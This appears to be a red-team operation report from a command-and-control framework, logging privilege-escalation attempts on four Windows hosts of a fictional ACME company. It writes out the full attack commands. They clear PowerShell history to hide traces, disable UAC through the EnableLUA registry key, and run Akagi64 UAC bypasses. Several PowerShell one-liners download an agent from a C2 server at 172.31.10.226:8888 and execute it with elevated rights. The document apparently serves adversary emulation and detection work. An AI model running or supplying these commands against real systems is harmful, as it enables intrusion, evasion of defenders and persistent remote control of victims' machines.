
Privilege Escalation
====================

Contents
========

* [Hosts Attacked](#hosts-attacked)
* [Links](#links)
	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
* [Steps](#steps)
	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)

# Hosts Attacked

|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
| :---: | :---: | :---: | :---: | :---: | :---: | :---: |
|ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
|ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
|ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
|ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|

# Links

(what exactly is a link? seems to be a command executed when initializing the beachhead?)
## Host: ACME-HH-ZYQ


  Technique: Indicator Removal on Host: Clear Command History

  PID: 2304

  Status: Success

  Start: 2024-09-04T03:18:40Z

  Finish: 2024-09-04T03:18:40Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-EUO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 4324

  Status: Success

  Start: 2024-09-13T17:10:22Z

  Finish: 2024-09-13T17:10:22Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-WS-PLU


  Technique: Indicator Removal on Host: Clear Command History

  PID: 8504

  Status: Success

  Start: 2024-09-13T17:12:11Z

  Finish: 2024-09-13T17:12:12Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-ESO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 10164

  Status: Success

  Start: 2024-09-13T17:15:40Z

  Finish: 2024-09-13T17:15:40Z

  Command: 
```powershell
Clear-History;Clear
```


# Steps

## Host: ACME-HH-ZYQ (paw: kwmxux)

###   Description: Set a registry key to allow UAC bypass


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 5212

  Start: 2024-09-13T17:39:40Z

  Command: 
```powershell
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
```


###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 3228

  Start: 2024-09-13T17:40:21Z

  Command: 
```powershell
.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
```


###   Description: UIPI bypass with uiAccess application


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 8740

  Start: 2024-09-13T17:42:29Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
```


###   Description: Bypass user account controls - medium


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 8132

  Start: 2024-09-13T17:44:10Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
```


## Host: ACME-HH-EUO (paw: acpuoe)

###   Description: Set a registry key to allow UAC bypass


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Success

  PID: 6508

  Start: 2024-09-13T17:40:17Z

  Command: 
```powershell
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
```


###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 5924

  Start: 2024-09-13T17:41:55Z

  Command: 
```powershell
.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
```


###   Description: UIPI bypass with uiAccess application


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 6996

  Start: 2024-09-13T17:43:52Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
```


###   Description: Bypass user account controls - medium


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 3316

  Start: 2024-09-13T17:45:27Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
```


## Host: ACME-WS-PLU (paw: hkrmxr)

###   Description: Set a registry key to allow UAC bypass


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Success

  PID: 5012

  Start: 2024-09-13T17:39:52Z

  Command: 
```powershell
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
```


###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 920

  Start: 2024-09-13T17:41:56Z

  Command: 
```powershell
.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
```


###   Description: UIPI bypass with uiAccess application


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 8300

  Start: 2024-09-13T17:43:25Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
```


###   Description: Bypass user account controls - medium


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 5432

  Start: 2024-09-13T17:45:29Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
```


## Host: ACME-HH-ESO (paw: nowkww)

###   Description: Set a registry key to allow UAC bypass


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 6172

  Start: 2024-09-13T17:40:18Z

  Command: 
```powershell
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
```


###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 9068

  Start: 2024-09-13T17:42:19Z

  Command: 
```powershell
.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
```


###   Description: UIPI bypass with uiAccess application


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Success

  PID: 8324

  Start: 2024-09-13T17:42:55Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
```


###   Description: Bypass user account controls - medium


  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}

  Status: Failed

  PID: 3188

  Start: 2024-09-13T17:45:39Z

  Command: 
```powershell
$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
```

